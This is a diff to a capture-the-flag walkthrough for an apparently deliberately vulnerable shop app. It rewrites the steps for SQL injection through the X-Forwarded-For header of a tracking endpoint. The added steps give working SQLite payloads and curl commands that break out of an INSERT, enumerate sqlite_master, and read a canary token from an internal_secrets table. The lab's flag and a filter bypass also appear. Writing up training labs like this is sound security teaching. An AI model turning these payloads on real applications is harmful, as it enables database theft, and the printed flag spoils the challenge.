@@ -83,42 +83,60 @@ The `ip` variable comes straight from the X-Forwarded-For header and lands in th
 
 ## Exploitation
 
-### Step 1: Understand the injection point
+### Step 1: Find the oracle
 
-The X-Forwarded-For header value is placed directly into the SQL INSERT statement:
+An `INSERT` returns no rows, so the first question is how to read anything back. The tracking endpoint answers it for us: it replies with the rows the request just wrote.
+
+```bash
+curl -X POST http://localhost:3000/api/tracking \
+  -H "Content-Type: application/json" \
+  -d '{"path": "/"}'
+```
+
+```json
+{
+  "success": true,
+  "logged": [
+    {
+      "id": "bd43ad6b-410d-4b34-815f-19cd026489c3",
+      "ip": "::1",
+      "userAgent": "curl/8.18.0",
+      "path": "/",
+      "sessionId": null,
+      "createdAt": "2026-01-24T20:16:00.000Z"
+    }
+  ]
+}
+```
+
+That echo is the whole game. A header that merely looks like SQL earns nothing — the flag drops only when a value read from a table the tracker never queries comes back inside `logged`.
+
+### Step 2: Close the value list
+
+The statement expects six values — `id`, `ip`, `userAgent`, `path`, `sessionId`, `createdAt` — and our header lands in the second one. So we finish the `ip` string, supply the four remaining values ourselves, close the parenthesis and comment out the rest:
+
+```
+1.2.3.4', (SELECT 1), '/x', NULL, datetime('now'))--
+```
+
+The server executes:
 
 ```sql
-INSERT INTO visitor_logs (..., ip, ...)
-VALUES (..., '${ip}', ...)
+INSERT INTO visitor_logs (id, ip, userAgent, path, sessionId, createdAt)
+VALUES ('…', '1.2.3.4', (SELECT 1), '/x', NULL, datetime('now'))--', 'curl/8.18.0', …)
 ```
 
-We can inject SQL by closing the string and using SQL operators or comments.
+The `userAgent` column now holds whatever sub-query we put in the second slot. When a payload does not compile, SQLite says so in the response, which makes this a comfortable place to iterate:
 
-### Step 2: Craft the SQL injection payload
-
-Any SQL injection payload will work. For example:
-
-**Using SQLite string concatenation (`||`):**
-
-```
-'||(SELECT 'Privacy matters. Dont track your users')||'
+```json
+{
+  "success": false,
+  "logged": [],
+  "error": "Raw query failed. Code: `1`. Message: `near \"curl\": syntax error`"
+}
 ```
 
-**Using SQL comments (`--`):**
-
-```
-127.0.0.1'; --
-```
-
-**Using UNION:**
-
-```
-' UNION SELECT 1--
-```
-
-### Step 3: Execute the injection
-
-Send a POST request to the tracking endpoint with the malicious header:
+The same slot accepts a literal, which is the shortest proof the injection runs — visible afterwards at `/admin/analytics`:
 
 ```bash
 curl -X POST http://localhost:3000/api/tracking \
@@ -127,21 +145,60 @@ curl -X POST http://localhost:3000/api/tracking \
   -d '{"path": "/exploit"}'
 ```
 
-Then, go to the analytics page. You'll see:
-
 ![Privacy Matters](../../assets/images/x-forwarded-for-sql-injection/privacy-matters.png)
 
-### Step 4: Retrieve the flag
+### Step 3: Enumerate the schema
 
-The API detects the SQL injection attempt and returns the flag directly in the response:
+SQLite keeps its own catalogue in `sqlite_master`. Read the table list through the column we control:
+
+```bash
+curl -X POST http://localhost:3000/api/tracking \
+  -H "X-Forwarded-For: 1.2.3.4', (SELECT group_concat(name) FROM sqlite_master WHERE type='table'), '/x', NULL, datetime('now'))--" \
+  -H "Content-Type: application/json" \
+  -d '{"path": "/"}'
+```
+
+```json
+"userAgent": "users,products,carts,cart_items,orders,order_items,addresses,flags,hints,revealed_hints,reviews,support_access_tokens,found_flags,project_init,visitor_logs,wishlists,wishlist_items,password_reset_tokens,supplier_orders,coupons,gift_cards,stream_config,sqlite_sequence,internal_secrets"
+```
+
+`flags` is a dead end: the endpoint answers `403` to any payload naming that table, and strips every `OSS{…}` value out of the echo. `internal_secrets` is the interesting one. Ask for its definition the same way:
+
+```
+1.2.3.4', (SELECT sql FROM sqlite_master WHERE name='internal_secrets'), '/x', NULL, datetime('now'))--
+```
+
+```sql
+CREATE TABLE "internal_secrets" ("id" TEXT NOT NULL PRIMARY KEY, "slug" TEXT NOT NULL, "token" TEXT NOT NULL)
+```
+
+One row per injection challenge, each keyed by the challenge slug.
+
+### Step 4: Exfiltrate the canary
+
+```bash
+curl -X POST http://localhost:3000/api/tracking \
+  -H "X-Forwarded-For: 1.2.3.4', (SELECT token FROM internal_secrets WHERE slug='x-forwarded-for-sql-injection'), '/x', NULL, datetime('now'))--" \
+  -H "Content-Type: application/json" \
+  -d '{"path": "/"}'
+```
 
 ```json
 {
   "success": true,
+  "logged": [
+    {
+      "ip": "1.2.3.4",
+      "userAgent": "CANARY-X-FORWARDED-FOR-SQL-INJECTION-a42f4413d416",
+      "path": "/x"
+    }
+  ],
   "flag": "OSS{x_f0rw4rd3d_f0r_sql1}",
-  "message": "SQL injection detected in X-Forwarded-For header! Well done!"
+  "message": "Internal secret exfiltrated through the X-Forwarded-For header! Well done!"
 }
 ```
+
+The token is generated at seed time, so it differs on every instance: the only way to produce it is to read it out of the database.
 
 The flag is:
 
